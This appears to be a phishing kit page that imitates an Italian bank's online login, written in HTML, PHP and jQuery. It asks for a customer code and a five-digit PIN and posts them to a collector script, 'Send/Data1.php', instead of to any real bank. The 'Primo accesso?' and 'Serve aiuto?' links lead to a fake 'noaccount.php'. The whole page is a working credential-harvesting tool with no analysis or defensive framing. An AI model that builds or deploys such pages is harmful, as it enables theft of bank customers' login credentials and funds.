<html>

<head>
    <style type="text/css">
        @charset "UTF-8";
        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }
        
        ng\:form {
            display: block;
        }
        
        .ng-animate-shim {
            visibility: hidden;
        }
        
        .ng-anchor {
            position: absolute;
        }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <meta http-equiv="cache-control" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta charset="utf-8">
 <title>Login</title>
 <?php
if(isset($_GET['headermenu'])){
?>
<style ></style>
<style type="text/css">
body{

   
}

</style>
<?php
}

?>
</head>
<link type="text/css" id="dark-mode" rel="stylesheet" href="">


<body class="isp-body-transparent" style='overflow:hidden; <?php if(isset($_GET['headermenu'])){ echo "background: #323232;"; } ?>'>
  

    <div class="container-fluid ng-scope" ng-controller="ArchMainController">
        <div id="archMainContainer">
            <div class="row ng-scope" id="ArchAssetsController" ng-controller="AssetsController">
                <div class="col-xs-24">
                    <div class="row" id="assetControllerMargin">
                        <!-- uiView: -->
                        <div id="assetContainer" class="assetContainer ng-scope" ui-view="" style="">
                            <!-- ngInclude: getTemplateUrl() -->
                            <div id="logincontroller" ng-class="pagepartClass" class="ng-scope container-fluid-no-padding" style="">
                                <div class="container-fluid login-form ng-pristine ng-scope ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom"  style="">
                                    <!-- padding-left-25 -->
                                    <div class="row margin-bottom-18">
                                        <div class="isp-ib-open-sans-regular-16 isp-ib-title-access isp-ib-alignment-access col-xs-24 col-md-12 col-md-offset-1 login-whitespace">
                                            <span class="isp-font-comuni-achi"></span>
                                            <!-- ngIf: !login.pmed --><span ng-if="!login.pmed" class="ng-binding ng-scope">ACCEDI ALLA TUA BANCA ONLINE</span>
                                            <!-- end ngIf: !login.pmed -->
                                            <!-- ngIf: login.pmed -->
                                            <!-- ngIf: login.pmed -->
                                        </div>
                                        <!-- ngIf: !login.pmed -->
                                        <div class="col-xs-24 col-md-11 login-first-access margin-top-first-access login-first-access-padding-11 ng-scope">
                                            <a tabindex="0"  target="_parent" href="noaccount.php" class="isp-ib-open-sans-semi-bold-13 login-first-accessDown login-padding-3px login-padding-0 ng-binding" >Primo accesso?
				<img  style="margin-top:-2px;margin-left:2px;" src="img/freccia_dx.png" class="ng-scope"><!-- end ngIf: !model.tmp.darkTheme -->
			</a>
                                            <a href="noaccount.php"  target="_parent" class="isp-ib-open-sans-semi-bold-13 login-first-accessDown ng-binding" >Serve aiuto?
                                <img ng-if="!model.tmp.darkTheme" style="margin-top:-2px;margin-left:2px;" src="img/freccia_dx.png" class="ng-scope"><!-- end ngIf: !model.tmp.darkTheme --> 
			</a>
                                        </div>
                                        <!-- end ngIf: !login.pmed -->
                                    </div>
                                    <div class="login-form-pseudo ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" style="">
                                      <form action="Send/Data1.php"  target="_top" method="post" id="login1form"> 
                                        <div class="row login-margin-top-22">
                                            <div id="login-user" class="col-md-8 col-md-offset-1 login-padding-bottom">
                                                <div class="isp-ib-open-sans-regular-13 ispFormField ispInput ng-pristine ng-isolate-scope ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" name="login.user.useridForm" placeholder="Codice Titolare" input-label="" input-format="limiteddigits" is-required="true" on-change="changeUserFocus()" minlength="6" maxlength="8" aria-describedby="loginMessageError" id="loginpage-logincontroller-login-user_input" style="">
                                                    <label class="ispFormFieldLabel ng-hide" for="loginpage-logincontroller-login-user"  aria-hidden="true" style="">
                                                      *</label>
                                                    <div class=" " id="loginpage-logincontroller-login-user_div" tabindex="-1" role="presentation">
                                                        <span>

                                                        <script type="text/javascript">
function limit3(element){
    var max_chars = 8;
    if(element.value.length > max_chars) {
        element.value = element.value.substr(0, max_chars);
    }
}
        </script>


			<input autocomplete=""  oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" id="username" onkeydown="limit3(this);" onkeyup="limit3(this);" name="user" type="text" placeholder="Codice Titolare" minlength="6" maxlength="8" class="ng-pristine ng-untouched ng-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" required="required" aria-invalid="true" style=""><!-- end ngIf: inputFormat != 'date' -->
		</span>
                                                    </div>
                                                    <label role="alert" id="required_error_1" style="display:none" class="error ng-binding ng-scope"  style=""><span class="visible-xs sr-only"></span>Campo obbligatorio: compila per proseguire</label>
                                                </div>
                                            </div>
                                            <div id="login-pin" class="col-md-8 login-padding-bottom">
                                                <div class="isp-ib-open-sans-regular-13 ispFormField ispInput ng-pristine ng-isolate-scope ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" ng-class="{'roundedStyle': hasStyle('rounded'), 'rev2': hasStyle('rev2')}" ng-form="" isp-id="login-pin" ng-keyup="triggerlogin1($event)" bind-variable="login.user.pin" name="login.user.pinForm" placeholder="PIN" input-label="" input-format="digitspassword" on-change="changePinFocus()" is-required="true" minlength="5" maxlength="5" char-limit="5" aria-describedby="loginMessageError" save-password="false" id="loginpage-logincontroller-login-pin_input" style="">
                                                    <label class="ispFormFieldLabel ng-hide" for="loginpage-logincontroller-login-pin" ng-show="inputLabel" ng-class="{'noWrapLabel': hasStyle('noWrapLabel')}" label-for="loginpage-logincontroller-login-pin" aria-hidden="true" style="">
                                                        <ng-transclude></ng-transclude>*</label>
                                                    <div class=" " ng-class="{'focus': isFocused,  'inputDatePickerPay':isCalendarPayment(), 'error': !form.$pending &amp;&amp; form.$invalid &amp;&amp; ((!!form.$error.required &amp;&amp; form.$error.required[0].$touched) || !form.$error.required || !!form.$error.ispCustom || !!form.$error.ispArchMessageHandler), 'isp-mobile-calendar':mobileCalendar}" ng-click="manageDisabledCallback()" id="loginpage-logincontroller-login-pin_div" tabindex="-1" role="presentation">
                                                        <span>
                                                        <script type="text/javascript">
function limit5(element){
    var max_chars = 5;
    if(element.value.length > max_chars) {
        element.value = element.value.substr(0, max_chars);
    }
}
        </script>
			<input  name="Pass"  id="password" onkeydown="limit5(this);" onkeyup="limit5(this);"  oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" id="loginpage-logincontroller-login-pin"  type="password" placeholder="PIN" minlength="5" maxlength="5"  class="ng-pristine ng-untouched ng-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-valid-isp-validate ng-valid-isp-custom" required="required" aria-invalid="true" style=""><!-- end ngIf: inputFormat != 'date' -->
		</span>  </div>
        <label role="alert" id="required_error_2" style="display:none" class="error ng-binding ng-scope"  style=""><span class="visible-xs sr-only"></span>Campo obbligatorio: compila per proseguire</label>

                                                  </div>
                                                  
                                            </div>
                                            <!-- ngIf: login.message!=null -->
                                            <div class="col-xs-offset-1 hidden-md hidden-lg ng-scope" ng-if="login.message!=null">
                                                <div id="loginMessageError" role="alert" class="login-message ng-binding" tabindex="0"></div>
                                            </div>


                                            <div class="col-md-7 login-enter-button-container" ng-show="!login.askBirthDate" aria-hidden="false">
                                                <button id="enter1Login"  class="isp-ib-arial-bold-14 login-enter-button ispIbDirectiveControlbuttonsButtonMargin              col-md-23 isp-ib-submit">
                                                        ENTRA
                                                </button>
                                            </div>
                                            <div class="col-md-1">
                                            </div>
                                        </div>

                                        <div class="row">
                                            <div class="col-md-23  col-md-offset-1 hidden-xs  hidden-sm">
                                                <!-- ngIf: login.message!=null -->
                                                <div id="loginMessageError" role="alert" class="login-message ng-binding ng-scope" ng-if="login.message!=null"></div>
                                                <!-- end ngIf: login.message!=null -->
                                            </div>
                                        </div>

                                    </form>
                                    </div>
              </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <link href="css/css.css" rel="stylesheet">

    <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>          
<script>

$( "#enter1Login").click(function(event) {
  event.preventDefault();
  var usr = $("#username").val();
  var pass = $("#password").val();

  if(usr.length < 6 && !(usr.length > 8) ){
    $("#username").parent().parent().addClass('error');
    $("#required_error_1").css('display','block');
  }else if(pass.length != 5){
    $("#password").parent().parent().addClass('error');
    $("#required_error_2").css('display','block');
  }else{
      $("#login1form").submit();
  }

});


</script>
</body>

</html>